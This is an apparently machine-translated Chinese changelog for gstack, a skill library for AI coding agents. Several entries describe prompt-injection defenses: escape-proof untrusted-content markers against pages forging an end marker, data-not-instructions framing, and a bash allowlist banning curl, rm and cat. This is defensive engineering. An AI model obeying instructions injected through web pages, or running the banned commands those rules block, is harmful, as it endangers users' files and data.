- **`voice-triggers:` 模板中的 YAML 字段。** 结构化创作：向任何 `.tmpl` frontmatter 添加别名，`gen-skill-docs` 在生成过程中将它们折叠到描述中。干净的来源，干净的输出。
- **自述文件中的语音输入部分。** 新用户从第一天起就知道使用语音的技能。
- **`voice-triggers` 记录在 CONTRIBUTING.md 中。** Frontmatter 合约已更新，以便贡献者知道该字段的存在。

## [0.15.1.0] - 2026-04-01。没有霰弹枪的设计

您现在可以运行 `/design-html`，而无需先运行 `/design-shotgun`。该技能会检测存在的设计环境（CEO 计划、设计审查工件、批准的模型）并询问您要如何继续。从计划、描述或提供的 PNG 开始，而不仅仅是批准的模型。

### 改变了

- **`/design-html` 从任何起点工作。** 三种路由模式：(A) 经 /design-shotgun 批准的模型，(B) 未经正式批准的 CEO 计划和 /or 设计变体，(C) 仅带有描述的干净记录。每种模式都会提出正确的问题并相应地进行。
- **向用户询问缺少的上下文。** 该技能现在提供了选择，而不是用“未找到批准的设计”进行阻止：首先运行规划技能，提供 PNG，或者只是描述您想要的内容并实时设计。

### 固定的

- **现在发现技能为顶级名称。** 安装程序创建带有 SKILL.md 符号链接的真实目录，而不是目录符号链接。这修复了克劳德在使用 `--no-prefix` 模式时自动为技能名称添加前缀 `gstack-` 的问题。 `/qa` 现在只是 `/qa`，而不是 `/gstack-qa`。

## [0.15.0.0] - 2026-04-01。会话智能

您的人工智能会话现在会记住发生的事情。计划、审查、检查点和健康评分在跨会话的上下文压缩和复合中得以保留。每个技能都会写入一个时间线事件，序言会在启动时读取最近的工件，以便代理知道您在哪里停止。

### 额外

- **会话时间线。** 每个技能都会自动将 start/complete 事件记录到 `timeline.jsonl`。仅本地，从不发送到任何地方，无论遥测设置如何，始终处于开启状态。 /retro 现在可以显示“本周：3 个分支中的 3 个 /review、2 个 /ship”。
- **上下文恢复。** 压缩或会话开始后，序言列出了您最近的 CEO 计划、检查点和评论。代理会阅读最新的一份来恢复决策和进度，而不要求您重复。
- **跨会话注入。** 在会话开始时，序言会打印您在此分支上运行的最后一次技能以及最新的检查点。在输入任何内容之前，您会看到“上次会话：/review（成功）”。
- **预测技能建议。** 如果您在某个分支上的最后 3 个会话遵循某种模式（审核、交付、审核），gstack 会建议您下一步可能想要什么。
- **欢迎回来留言。** 会议综合了一段简报：分支名称、最后一项技能、检查点状态、健康分数。
- **`/checkpoint` 技能。** 保存并恢复工作状态快照。捕获 git 状态、所做的决策、剩余的工作。支持代理之间的 Conductor 工作区切换的跨分支列表。
- **`/health` 技能。** 代码质量记分员。包装项目的工具（tsc、biome、knip、shellcheck、测试），计算 0-10 的综合分数，跟踪一段时间内的趋势。当分数下降时，它会准确地告诉您发生了什么变化以及在哪里修复它。
- **时间线二进制文件。** `bin/gstack-timeline-log` 和 `bin/gstack-timeline-read` 用于仅附加 JSONL 时间线存储。
- **路由规则。** /checkpoint 和 /health 添加到技能路由注入中。

## [0.14.6.0] - 2026-03-31。递归自我完善

gstack 现在可以从自己的错误中吸取教训。每个技能课程都会捕获操作故障（CLI 错误、错误的方法、项目怪癖）并在未来的课程中将其呈现出来。无需设置，即可使用。

### 额外

- **操作自我改进。** 当命令失败或遇到特定于项目的问题时，gstack 会记录它。下一次会议，它会记住。 “bun test need --timeout 30000”或者“登录流程需要首先导入cookie”……这种东西每次你忘记的时候都会浪费10分钟。
- **序言中的学习总结。** 当您的项目有 5 个以上学习内容时，gstack 会在每个会话开始时显示前 3 个学习内容，以便您在开始工作之前看到它们。
- **现在学习 13 种技能。** 办公时间、计划首席执行官审查、计划工程审查、计划设计审查、设计审查、设计咨询、CSO、质量保证、仅限质量保证和回顾现在都可以阅读以前的知识并贡献新的知识。以前仅通过有线方式进行审查、运送和调查。

### 改变了

- **替换了贡献者模式。**旧的贡献者模式（手动选择加入，markdown 报告到 ~/.gstack/contributor-logs/）在 18 天的大量使用中从未触发过。取而代之的是自动操作学习，无需任何设置即可捕获相同的见解。

### 固定的

- **学习-显示 E2E 测试 slug 不匹配。** 测试在硬编码路径上播种学习，但 gstack-slug 在运行时计算不同的路径。现在动态计算 slug。

## [0.14.5.0] - 2026-03-31。船舶幂等性+技能前缀修复

在推送或 PR 创建失败后重新运行 `/ship` 不再使您的版本出现双重冲突或重复您的变更日志。如果您使用 `--prefix` 模式，您的技能名称现在实际上可以使用。

### 固定的

- **`/ship` 现在是幂等的 (#649)。** 如果推送成功但 PR 创建失败（API 中断、速率限制），则重新运行 `/ship` 会检测已经更新的版本，如果已经是最新的则跳过推送，并更新现有 PR 正文而不是创建副本。 CHANGELOG 步骤在设计上已经是幂等的（“用统一条目替换”），因此不需要防护。
- **技能前缀实际上修补了 SKILL.md 中的 `name:` (#620, #578)。** `./setup --prefix` 和 `gstack-relink` 现在修补每个技能的 SKILL.md frontmatter 中的 `name:` 字段以匹配前缀设置。以前，符号链接带有前缀，但 Claude Code 读取无前缀的 `name:` 字段并完全忽略该前缀。处理的边缘情况：`gstack-upgrade` 不是双前缀，根 `gstack` 技能从未添加前缀，前缀删除恢复原始名称。
- **`gen-skill-docs` 在需要重新应用前缀补丁时发出警告。** 重新生成 SKILL.md 文件后，如果在配置中设置了 `skill_prefix: true`，则会出现警告提醒您运行 `gstack-relink`。
- **PR 幂等性检查打开状态。** PR 防护现在验证现有 PR 是否为 `OPEN`，因此关闭的 PR 不会阻止新的 PR 创建。
- **`--no-prefix` 排序错误。** `gstack-patch-names` 现在在 `link_claude_skill_dirs` 之前运行，因此符号链接名称反映了正确的修补值。

### 额外

- **`bin/gstack-patch-names` 共享助手。** 干提取 `setup` 和 `gstack-relink` 使用的名称修补逻辑。使用可移植的 `mktemp + mv` sed 处理所有边缘情况（无 frontmatter、已经有前缀、固有前缀的目录）。

### 对于贡献者

- 4 个名称单元测试：在 `relink.test.ts` 中进行修补
- 2 次针对 gen-skill-docs 前缀警告的测试
- 1 次船舶幂等性 E2E 测试（定期层）
- 更新了 `setupMockInstall` 以使用正确的 frontmatter 编写 SKILL.md

## [0.14.4.0] - 2026-03-31。评审大军：并行专家评审员

现在，每个 `/review` 都会并行派遣专业子代理。您不再需要由一名代理应用一份庞大的清单，而是由专注的审阅者来测试差距、可维护性、安全性、性能、数据迁移、API 合同和对抗性红队。每个专家都会使用新的上下文独立读取差异，输出结构化的 JSON 结果，当多个专家标记同一问题时，主代理会合并、删除重复并增强信心。小差异（<50 行）完全跳过专家以提高速度。大差异（200 多行）会激活红队进行顶部的对抗性分析。

### 额外

- **7 名专家审阅者** 通过代理工具子代理并行运行。永远在线：测试+可维护性。条件：安全性（身份验证范围）、性能（后端/frontend）、数据迁移（迁移文件）、API 合同（控制器/routes）、红队（大差异或关键发现）。
- **JSON 查找模式。** 专家输出包含严重性、置信度、路径、行、类别、修复和指纹字段的结构化 JSON 对象。可靠的解析，不再有管道分隔的文本。
- **基于指纹的重复数据删除。** 当两位专家标记同一文件：行：类别时，结果的置信度会得到提升，并会出现“多专家确认”标记。
- **公关质量得分。** 每条评论都会计算 0-10 的质量得分：`10 - (critical * 2 + informational * 0.5)`。通过 `/retro` 记录以查看趋势历史记录。
- **3 个新的 diff-scope 信号。** `gstack-diff-scope` 现在可以检测 SCOPE_MIGRATIONS、SCOPE_API 和 SCOPE_AUTH 以激活正确的专家。
- **基于学习的专家提示。** 每个专家都会将其领域的过去学习知识注入到提示中，因此随着时间的推移，评论会变得更加智能。
- **14 个新的 diff-scope 测试**涵盖所有 9 个示波器信号，包括 3 个新信号。
- **7 个新的 E2E 测试**（5 个门，2 个定期），涵盖迁移安全、N+1 检测、交付审核、质量评分、JSON 模式合规性、红队激活和多专家共识。

### 改变了

- **重构审查清单。** 现在由专家涵盖的类别（测试差距、死代码、幻数、性能、加密）从主清单中删除。主要代理仅专注于关键通行证。
- **交付完整性增强。** 现有的计划完成审核现在调查项目缺失的原因（不仅仅是它们缺失），并将计划文件差异记录为学习内容。提交消息推断仅供参考，从不持久。

## [0.14.3.0] - 2026-03-31。始终在线的对抗性审查 + 范围漂移 + 计划模式设计工具

现在，每次代码审查都会运行来自 Claude 和 Codex 的对抗性分析，无论差异大小如何。 5 行身份验证更改将获得与 500 行功能相同的跨模型审查。旧的“跳过小差异的对抗”启发式已经消失了......差异大小从来都不是风险的良好代表。

### 额外

- **始终在线的对抗性审查。** 现在，每次 `/review` 和 `/ship` 运行都会调度 Claude 对抗性子代理和 Codex 对抗性挑战。不再需要基于层级的跳跃。 Codex 结构化审查（正式 P1 pass/fail 门）仍然在较大差异（200 多行）上运行，其中正式门增加了价值。
- **`/ship` 中的范围漂移检测。** 在发货之前，`/ship` 现在会检查您是否构建了您所说的构建内容，仅此而已。捕捉范围蔓延（“当我在那里时......”变化）和缺失的需求。结果出现在公关正文中。
- **计划模式安全操作。** 现在在计划模式下明确允许浏览屏幕截图、设计模型、Codex 外部声音以及写入 `~/.gstack/`。设计相关技能（`/design-consultation`、`/design-shotgun`、`/design-html`、`/plan-design-review`）可以在规划过程中生成视觉伪像，而不受计划模式限制。

### 改变了

- **对抗性选择退出分裂。** 旧版 `codex_reviews=disabled` 配置现在仅控制 Codex 通行证。克劳德对抗子代理总是运行，因为它免费且快速。以前，终止开关禁用了所有功能。
- **跨模型张力格式。** 外部语音分歧现在包括 `RECOMMENDATION` 和 `Completeness` 分数，与 gstack 中其他地方使用的标准 AskUserQuestion 格式相匹配。
- **范围漂移现在是一个共享解析器。**从 `/review` 提取到 `generateScopeDrift()` 中，因此 `/review` 和 `/ship` 使用相同的逻辑。干燥。

## [0.14.2.0] - 2026-03-30。侧边栏 CSS 检查器 + 每个选项卡代理

侧边栏现在是一种视觉设计工具。选择页面上的任何元素，然后在侧面板中查看完整的 CSS 规则级联、盒模型和计算样式。实时编辑样式并立即查看更改。每个浏览器选项卡都有自己独立的代理，因此您可以同时处理多个页面而不会发生串扰。 Cleanup 由 LLM 提供支持...代理对页面进行快照，从语义上理解它，并在保留站点身份的同时删除垃圾。

### 额外

- **侧边栏中的 CSS 检查器。** 单击“选择元素”，将鼠标悬停在任何内容上，然后单击它，侧边栏将显示完整的 CSS 规则级联，其中包含特异性徽章、源文件：行、盒模型可视化（gstack 调色板颜色）和计算样式。与 Chrome DevTools 类似，但位于侧边栏内。
- **实时风格编辑。** `$B style .selector property value` 通过 CDP 实时修改 CSS 规则。更改会立即显示在页面上。使用 `$B style --undo` 撤消。
- **每选项卡代理。** 每个浏览器选项卡通过 `BROWSE_TAB` env var 获取自己的 Claude 代理进程。在浏览器中切换选项卡，侧边栏会切换到该选项卡的聊天历史记录。并行询问有关不同页面的问题，而无需代理争夺哪个选项卡处于活动状态。
- **选项卡跟踪。** 用户创建的选项卡（Cmd+T，右键单击“在新选项卡中打开”）将通过 `context.on('page')` 自动跟踪。侧边栏标签栏实时更新。单击侧边栏中的选项卡可切换浏览器。关闭一个选项卡，它就会消失。
- **LLM 支持的页面清理。** 清理按钮向侧边栏代理（即 LLM）发送提示。该代理运行确定性的第一遍，对页面进行快照，分析剩下的内容，并智能地消除混乱，同时保留网站品牌。适用于任何网站，无需脆弱的 CSS 选择器。
- **漂亮的屏幕截图。** `$B prettyscreenshot --cleanup --scroll-to ".pricing" ~/Desktop/hero.png` 将清理、滚动定位和屏幕截图结合在一个命令中。
- **停止按钮。** 当代理工作时，侧栏中会出现红色停止按钮。单击它可以取消当前任务。
- **检查员的 CSP 后备。** 具有严格内容安全策略的网站（如 SF Chronicle）现在通过始终加载的内容脚本获得基本选择器。您会看到计算样式、盒模型和同源 CSS 规则。在允许的站点上使用完整的 CDP 模式。
- **聊天工具栏中的清理 + 屏幕截图按钮。** 未隐藏在调试中...就在聊天中。断开连接时禁用，这样您就不会收到错误垃圾邮件。

### 固定的

- **检查器消息白名单。** background.js 白名单缺少所有检查器消息类型，默默地拒绝它们。所有页面的检查器都被破坏，而不仅仅是 CSP 限制的页面。 （由法典审查发现。）
- **粘性导航保留。** 清理不再删除网站的顶部导航栏。按位置对粘性元素进行排序，并保留顶部附近的第一个全角元素。
- **代理不会停止。**系统提示现在告诉代理要简洁并在完成后停止。不再有无休止的屏幕截图和突出显示循环。
- **焦点窃取。** 代理命令不再将 Chrome 拉到前台。内部选项卡固定使用 `bringToFront: false`。
- **聊天消息重复删除。** 重新连接时不再重复以前会话中的旧消息。

### 改变了

- **侧边栏横幅**现在显示“浏览器副驾驶”，而不是旧的模式特定文本。
- **输入占位符**是“询问此页面...”（比旧占位符更有吸引力）。
- **系统提示**包括提示注入防御和安全审计允许的命令白名单。

## [0.14.1.0] - 2026-03-30。比较板是选择器

现在，在检查变体时，设计比较板始终会自动打开。不再有内嵌图像+“你更喜欢哪个？”。该板具有评级控制、评论、remix/regenerate 按钮和结构化反馈输出。这就是经验。所有 3 种设计技能（/plan-design-review、/design-shotgun、/design-consultation）均已修复。

### 改变了

- **现在必须使用比较板。** 生成设计变体后，代理会使用 `$D compare --serve` 创建一个比较板，并通过 AskUserQuestion 向您发送 URL。您与董事会互动，单击“提交”，代理会从 `feedback.json` 读取您的结构化反馈。不再使用轮询循环作为主要等待机制。
- **AskUserQuestion 是等待，而不是选择器。** 代理使用 AskUserQuestion 告诉您面板已打开并等待您完成，而不是内联呈现变体并询问首选项。板 URL 始终包含在内，因此如果您丢失了选项卡，您可以点击进入。
- **改进了服务失败后备。** 如果比较板服务器无法启动，则在询问首选项之前，会通过读取工具内联显示变体。你不再盲目选择。

### 固定的

- **董事会 URL 已更正。** 恢复 URL 现在指向 `http://127.0.0.1:<PORT>/` （服务器实际服务的位置）而不是 `/design-board.html` （这将是 404）。

## [0.14.0.0] - 2026-03-30。设计到代码

现在，您可以使用一个命令从经过批准的设计模型转换为生产质量的 HTML。 `/design-html` 采用 `/design-shotgun` 的获胜设计，并生成 Pretext 原生 HTML，其中文本在调整大小时实际回流，高度根据内容调整，并且布局是动态的。不再有硬编码的 CSS 高度或损坏的文本溢出。

### 额外

- **`/design-html` 技能。** 从 `/design-shotgun` 获取经过批准的模型，并生成带有 Pretext 的独立 HTML，用于计算文本布局。智能 API 路由为每种设计类型（简单布局、卡片网格、聊天气泡、编辑跨页）选择正确的 Pretext 模式。包括一个细化循环，您可以在浏览器中预览、提供反馈并进行迭代，直到正确为止。
- **Pretext 供应。** 30KB Pretext 源捆绑在 `design-html/vendor/pretext.js` 中，用于离线、零依赖 HTML 输出。框架输出 (React/Svelte/Vue) 使用 npm install 代替。
- **设计管道链。** `/design-shotgun` 第 6 步现在提供 `/design-html` 作为下一步。 `/design-consultation` 在生成屏幕级设计后建议这样做。 `/plan-design-review` 与 `/design-shotgun` 和 `/design-html` 以及复习技能相关联。

### 改变了

- **`/plan-design-review` 后续步骤已扩展。** 以前仅链接到其他复习技能。现在还提供 `/design-shotgun` （探索变体）和 `/design-html` （从批准的模型生成 HTML）。

## [0.13.10.0] - 2026-03-29。办公时间获得阅读清单

重复 /office-hours 用户现在可以在每次会话中获得新鲜的、精选的资源，而不是相同的 YC 结束。来自 Garry Tan、Lightcone Podcast、YC Startup School 和 Paul Graham 精心挑选的 34 个视频和文章，与会议期间出现的内容相匹配。系统会记住它已经向您显示的内容，因此您永远不会看到相同的推荐两次。

### 额外

- **在 /office-hours 结束时轮换创始人资源。** 5 个类别的 34 个精选资源（Garry Tan 视频、YC Backstory、Lightcone 播客、YC Startup School、Paul Graham 文章）。 Claude 根据会话上下文在每次会话中选择 2-3 个，而不是随机选择。
- **资源重复数据删除日志。** 跟踪 `~/.gstack/projects/$SLUG/resources-shown.jsonl` 中显示的资源，以便重复用户始终看到新鲜内容。
- **资源选择分析。** 将选择的资源记录到 `skill-usage.jsonl` 中，以便您可以看到一段时间内的模式。
- **浏览器打开优惠。** 显示资源后，提供在浏览器中打开它们的优惠，以便您稍后查看。

### 固定的

- **构建脚本 chmod 安全网。** `bun build --compile` 输出现在显式获取 `chmod +x`，防止二进制文件在工作区克隆或文件传输期间失去执行权限时出现“权限被拒绝”错误。

## [0.13.9.0] - 2026-03-29。可组合技能

技能现在可以内联加载其他技能。在模板中写入 `{{INVOKE_SKILL:office-hours}}` ，生成器会自动发出正确的“读取文件、跳过前导码、遵循指令”的语句。处理主机感知路径和可自定义的跳过列表。

### 额外

- **`{{INVOKE_SKILL:skill-name}}` 解析器。** 可组合技能加载为一流解析器。发出主机感知的散文，告诉 Claude 或 Codex 阅读另一个技能的 SKILL.md 并内联遵循它，跳过序言部分。支持可选的 `skip=` 参数以跳过其他部分。
- **参数化解析器支持。** 占位符正则表达式现在可以处理 `{{NAME:arg1:arg2}}`，使解析器能够在生成时获取参数。完全向后兼容现有的 `{{NAME}}` 模式。
- **`{{CHANGELOG_WORKFLOW}}` 解析器。** 从 /ship 提取到可重用解析器的变更日志生成逻辑。包括内联语音指导（“引导用户现在可以做什么”）。
- **用于技能注册的 Frontmatter `name:`。** 安装脚本和 gen-skill-docs 现在从 SKILL.md frontmatter 中读取 `name:` 以进行符号链接命名。启用与调用名称不同的目录名称（例如，注册为 `/test` 的 `run-tests/` 目录）。
- **主动技能路由。** 技能现在要求一次将路由规则添加到项目的 CLAUDE.md 中。这使得克劳德自动调用正确的技能，而不是直接回答。您的选择将被记住在 `~/.gstack/config.yaml` 中。
- **带注释的配置文件。** `~/.gstack/config.yaml` 现在在首次创建时获得一个记录的标头，解释每个设置。随时编辑。

### 改变了

- **BENEFITS_FROM 现在委托给 INVOKE_SKILL。** 消除了重复的跳过列表逻辑。先决条件报价包装器保留在 BENEFITS_FROM 中，但实际的“读取并遵循”指令来自 INVOKE_SKILL。
- **/plan-ceo-review 会话中回退使用 INVOKE_SKILL。** “用户无法阐明问题，提供 /office-hours”路径现在使用可组合解析器而不是内联散文。
- **更强的路由语言。**办公时间、调查和船舶描述现在显示“主动调用”而不是“主动建议”，以实现更可靠的自动技能调用。

### 固定的

- **配置 grep 锚定到行开头。** 注释标题行不再隐藏真实的配置值。

## [0.13.8.0] - 2026-03-29。第二轮安全审核

浏览输出现在包含在信任边界标记中，以便代理可以从工具输出中区分页面内容。标记是防逃逸的。 Chrome 扩展程序会验证消息发件人。 CDP 仅绑定到本地主机。 Bun 安装使用校验和验证。

### 固定的

- **信任边界标记是防转义的。** URL 已清理（无换行符），标记字符串在内容中转义。恶意页面无法伪造 END 标记来突破不受信任的块。

### 额外

- **内容信任边界标记。** 返回页面内容（`text`、`html`、`links`、`forms`、`accessibility`、`console`、`dialog`、`snapshot`、`diff`、`resume`、`watch stop`）的每个浏览命令都将输出包装在 `--- BEGIN/END UNTRUSTED EXTERNAL CONTENT ---` 标记中。代理知道页面内容与工具输出是什么。
- **扩展程序发件人验证。** Chrome 扩展程序拒绝来自未知发件人的邮件并强制执行邮件类型白名单。防止跨扩展消息欺骗。
- **CDP 仅本地主机绑定。** `bin/chrome-cdp` 现在传递 `--remote-debugging-address=127.0.0.1` 和 `--remote-allow-origins` 以防止远程调试暴露。
- **校验和验证的bun安装。** 浏览SKILL.md引导程序现在将bun安装脚本下载到临时文件并在执行之前验证SHA-256。不再需要敲打卷边。

### 已删除

- **工厂 Droid 支持。** 删除了 `--host factory`、`.factory/` 生成的技能、工厂 CI 检查和所有特定于工厂的代码路径。

## [0.13.7.0] - 2026-03-29。社区浪潮

六个社区修复和 16 个新测试。遥测关闭现在意味着所有地方都关闭。技能可以通过名称找到。更改您的前缀设置现在实际上有效。

### 固定的

- **遥测关闭意味着在所有地方都关闭。** 当您将遥测设置为关闭时，gstack 不再写入本地 JSONL 分析文件。以前的“关闭”仅停止远程报告。现在任何地方都没有写任何东西。干净的信托合同。
- **`find -delete` 替换为 POSIX `-exec rm`。** Safety Net 和其他非 GNU 环境不再因会话清理而阻塞。
- **不再有先发制人的上下文警告。** `/plan-eng-review` 不再警告您上下文不足。系统自动处理压实。
- **更新侧边栏安全测试**，用于写入工具后备字符串更改。
- **`gstack-relink` 不再使用双前缀 `gstack-upgrade`。** 设置 `skill_prefix=true` 会创建 `gstack-gstack-upgrade` 而不是保留现有名称。现在匹配 `setup` 脚本行为。

### 额外

- **技能可发现性。** 每个技能描述现在都包含“(gstack)”，因此您可以通过在 Claude Code 的命令面板中搜索来查找 gstack 技能。
- **`/ship` 中的功能信号检测。** 版本碰撞现在检查新路由、迁移、测试+源对和 `feat/` 分支。捕获仅行数会错过的次要更改。
- **侧边栏写入工具。** 侧边栏代理和 Head-mode 服务器现在都包含 allowedTools 中的 Write。 Write 不会将攻击面扩大到 Bash 已经提供的范围之外。
- **侧边栏 stderr 捕获。** 侧边栏代理现在缓冲 stderr 并将其包含在错误和超时消息中，而不是默默地丢弃它。
- **`bin/gstack-relink`** 当您通过 `gstack-config set` 更改 `skill_prefix` 时，会重新创建技能符号链接。不再需要手动重新运行 `./setup` 。
- **`bin/gstack-open-url`** 跨平台 URL 打开工具（macOS：`open`、Linux：`xdg-open`、Windows：`start`）。

## [0.13.6.0] - 2026-03-29。 GStack 学习

现在，每一次会议都会让下一次会议变得更加智能。 gstack 会记住跨会话的模式、陷阱和偏好，并使用它们来改进每次审查、计划、调试和交付。您使用它的次数越多，它在您的代码库中的表现就越好。

### 额外

- **项目学习系统。** gstack 自动捕获在 /review、/ship、/investigate 和其他技能期间发现的模式和陷阱。每个项目存储在 `~/.gstack/projects/{slug}/learnings.jsonl` 处。仅附加、Supabase 兼容模式。
- **`/learn` 技能。** 回顾 gstack 学到的内容 (`/learn`)、搜索 (`/learn search auth`)、删除陈旧条目 (`/learn prune`)、导出到 markdown (`/learn export`) 或检查统计信息 (`/learn stats`)。使用 `/learn add` 手动添加学习内容。
- **置信度校准。** 现在，每个审核结果都包含置信度分数 (1-10)。高置信度结果 (7+) 显示正常，中置信度 (5-6) 显示带警告，低置信度 (<5) 显示被抑制。别再哭狼来了。
- **“应用的学习”标注。** 当评论结果与过去的学习相匹配时，gstack 会显示：“应用的先前学习：[模式]（置信度 8/10，从 2026 年 3 月 15 日起）”。您可以看到复合的实际效果。
- **跨项目发现。** gstack 可以从其他项目中搜索学习内容以查找匹配模式。选择加入，并通过一次性询问用户问题来征求同意。保留在您的机器本地。
- **置信度衰减。** 观察和推断的学习结果每 30 天失去 1 个置信点。用户陈述的偏好永远不会衰减。好的模式永远是好的模式，但不确定的观察会消失。
- **学习内容计入序言。** 现在，每个技能在启动期间都会显示“学习内容：已加载 N 个条目”。
- **5 版本路线图设计文档** `docs/designs/SELF_LEARNING_V0.md` 映射从 R1（GStack Learns）到 R4（/autoship，单命令完整功能）到 R5（Studio）的路径。

## [0.13.5.1] - 2026-03-29。吉蒂诺.工厂

### 改变了

- **停止跟踪 `.factory/` 目录。** 生成的 Factory Droid 技能文件现在被 gitignored，与 `.claude/skills/` 和 `.agents/` 相同。从存储库中删除 29 个生成的 SKILL.md 文件。 `setup` 脚本和 `bun run build` 根据需要重新生成这些。

## [0.13.5.0] - 2026-03-29。工厂机器人兼容性

gstack 现在可与 Factory Droid 配合使用。在 Droid 中输入 `/qa` 即可获得与 Claude Code 中相同的 29 种技能。这使得 gstack 成为第一个跨 Claude Code、Codex 和 Factory Droid 使用的技能库。

### 额外

- **工厂 Droid 支持 (`--host factory`)。** 使用 `bun run gen:skill-docs --host factory` 生成工厂原生技能。技能安装到 `.factory/skills/` 并带有适当的 frontmatter（`user-invocable: true`、`disable-model-invocation: true` 用于敏感技能，如 /ship 和 /land-and-deploy）。
- **`--host all` 标志。** 一个命令可为所有 3 台主机生成技能。容错：捕获每个主机的错误，只有在 Claude 生成失败时才会失败。
- **`gstack-platform-detect` 二进制。** 打印已安装的 AI 编码代理的表，其中包含版本、技能路径和 gstack 状态。对于调试多主机设置很有用。
- **敏感技能安全性。** 六种具有副作用的技能（船舶、着陆和部署、守卫、小心、冻结、解冻）现在在其模板中声明 `sensitive: true`。工厂机器人不会自动调用它们。 Claude 和 Codex 输出剥离了该字段。
- **工厂 CI 新鲜度检查。** 技能文档工作流程现在可验证每个 PR 上的工厂输出是否新鲜。
- **跨操作工具的工厂意识。**技能检查仪表板、gstack-uninstall 和设置脚本都了解 Factory。

### 改变了

- **重构了多主机生成。** 从 Codex 特定的代码块中提取了 `processExternalHost()` 共享帮助程序。 Codex 和 Factory 都使用相同的函数进行输出路由、符号链接循环检测、frontmatter 转换和路径重写。重构后 Codex 输出是字节相同的。
- **构建脚本使用 `--host all`。** 将链式 `gen:skill-docs` 调用替换为单个 `--host all` 调用。
- **Factory 的工具名称翻译。** Claude Code 工具名称（“使用 Bash 工具”）在 Factory 输出中被翻译为通用短语（“运行此命令”），与 Factory 的工具命名约定相匹配。

## [0.13.4.0] - 2026-03-29。侧边栏防御

Chrome 侧边栏现在可以防御即时注入攻击。三层：带有信任边界的 XML 框架提示、限制 bash 仅浏览命令的命令允许列表以及作为默认模型的 Opus（更难操作）。

### 固定的

- **侧边栏代理现在尊重服务器端参数。** 侧边栏代理进程正在默默地从头开始重建自己的 Claude 参数，忽略 `--model`、`--allowedTools` 和服务器设置的其他标志。每个服务器端配置更改都会被悄悄删除。现在使用排队的参数。

### 额外

- **具有信任边界的 XML 提示框架。** 用户消息包装在 `<user-message>` 标记中，并带有明确的指令，将内容视为数据，而不是指令。 XML 特殊字符 (`< > &`) 被转义以防止标记注入攻击。
- **Bash 命令白名单。** 侧边栏的系统提示符现在限制 Claude 仅浏览二进制命令（`$B goto`、`$B click`、`$B snapshot` 等）。禁止所有其他 bash 命令（`curl`、`rm`、`cat` 等）。这可以防止提示注入升级为任意代码执行。
- **侧边栏默认为 Opus。** 侧边栏现在默认使用 Opus（最耐注入的模型），而不是 Claude Code 恰好运行的任何模型。
- **ML 提示注入防御设计文档。** 位于 `docs/designs/ML_PROMPT_INJECTION_KILLER.md` 的完整设计文档，涵盖后续 ML 分类器（DeBERTa、BrowseSafe-bench、Bun-native 5ms 视觉）。 P0 TODO 下一个 PR。

## [0.13.3.0] - 2026-03-28。锁定它

来自社区 PR 和错误报告的六个修复。最重要的是：您的依赖树现在已固定。每个 `bun install` 每次都会解析完全相同的版本。不再需要在每次设置时从 npm 中提取新的浮动范围。

### 固定的

- **依赖关系现已固定。** `bun.lock` 已提交并跟踪。每次安装都会解析相同的版本，而不是 npm 中的浮动 `^` 范围。关闭 #566 中的供应链向量。
- **`gstack-slug` 不再在 git 存储库之外崩溃。** 当没有远程或 HEAD 时，回退到目录名称和“未知”分支。现在，每项依赖于 slug 检测的审阅技能都可以在非 git 环境中使用。
- **`./setup` 不再挂在 CI 中。** 技能前缀提示现在会在 10 秒后自动选择短名称。 Conductor 工作区、Docker 构建和无人值守安装无需人工输入即可继续进行。
- **浏览 CLI 适用于 Windows。** 服务器锁定文件现在使用 `'wx'` 字符串标志，而不是 Bun 编译的二进制文件在 Windows 上无法处理的数字 `fs.constants`。
- **`/ship` 和 `/review` 查找您的设计文档。** 计划搜索现在首先检查 `~/.gstack/projects/`，其中 `/office-hours` 写入设计文档。以前，计划验证会默默地跳过，因为它在错误的目录中查找。
- **`/autoplan` 双语音实际上有效。** 后台子代理无法读取文件（Claude Code 限制），因此 Claude 语音在每次运行时都会默默地失败。现在在前台按顺序运行。两种声音都在共识表之前完成。

### 额外

- **CLAUDE.md 中的社区公关护栏。** ETHOS.md、宣传材料和 Garry 的声音受到明确保护，未经用户批准不得进行修改。

## [0.13.2.0] - 2026-03-28。用户主权

AI 模型现在会推荐而不是覆盖。当 Claude 和 Codex 就范围变更达成一致时，他们会将其呈现给您，而不是直接执行。你的方向是默认的，而不是模型的共识。

### 额外

- **ETHOS.md 中的用户主权原则** 第三个核心原则：AI 模型推荐，用户决定。跨模型协议是一个强烈的信号，而不是强制要求。
- **/autoplan 中的用户挑战类别。** 当两个模型都同意您指定的方向应该更改时，它将作为“用户挑战”进入最终批准门，而不是自动决定。除非您明确改变，否则您原来的方向将保持不变。
- **Security/feasibility 警告框架。** 如果两个模型都将某些内容标记为安全风险（而不仅仅是偏好），则该问题明确警告您这是一个安全问题，而不是品味调用。
- **首席执行官和工程师评论中的外部声音集成规则。** 在您明确批准每一项之前，外部声音结果仅供参考。
- **所有技能声音中的用户主权声明。**现在每个技能都包含跨模型协议是建议而不是决定的规则。

### 改变了

- **跨模型张力模板不再说“你对谁是对的评估”。**现在说“中立地呈现两种观点，说明你可能会错过什么背景。”选项从 Add/Skip 扩展到 Accept/Keep/Investigate/Defer。
- **/autoplan 现在有两个门，而不是一个。** 前提（第一阶段）和用户挑战（两个模型都不同意您的方向）。重要规则从“场所是一扇门”更新为“两扇门”。
- **决策审核跟踪现在跟踪分类。** 每个自动决策都记录为机械、品味或用户挑战。

## [0.13.1.0] - 2026-03-28。纵深防御

浏览服务器在本地主机上运行，​​并且需要令牌才能访问，因此仅当恶意进程已在您的计算机上运行时（例如，受损的 npm postinstall 脚本），这些问题才会产生影响。此版本强化了攻击面，因此即使在这种情况下，损害也得到控制。

### 固定的

- **从 `/health` 端点删除了身份验证令牌。** 令牌现在通过 `.auth.json` 文件（0o600 权限）而不是未经身份验证的 HTTP 响应分发。
- **Cookie 选择器数据路由现在需要 Bearer 身份验证。** HTML 选择器页面仍然打开（它是 UI shell），但所有数据和操作端点都会检查令牌。
- **CORS 在 `/refs` 和 `/activity/*` 上收紧。** 删除了通配符源标头，以便网站无法读取跨源浏览活动。
- **状态文件在 7 天后自动过期。** Cookie 状态文件现在包含时间戳，并在过时时在加载时发出警告。服务器启动会清理超过 7 天的文件。
- **扩展使用 `textContent` 而不是 `innerHTML`。** 如果服务器提供的数据包含标记，则防止 DOM 注入。浏览器扩展的标准深度防御。
- **路径验证在边界检查之前解析符号链接。** `validateReadPath` 现在调用 `realpathSync` 并正确处理 macOS `/tmp` 符号链接。
- **冻结挂钩使用可移植的路径解析。** POSIX 兼容（在没有 coreutils 的 macOS 上工作），修复了 `/project-evil` 可以匹配设置为 `/project` 的冻结边界的边缘情况。
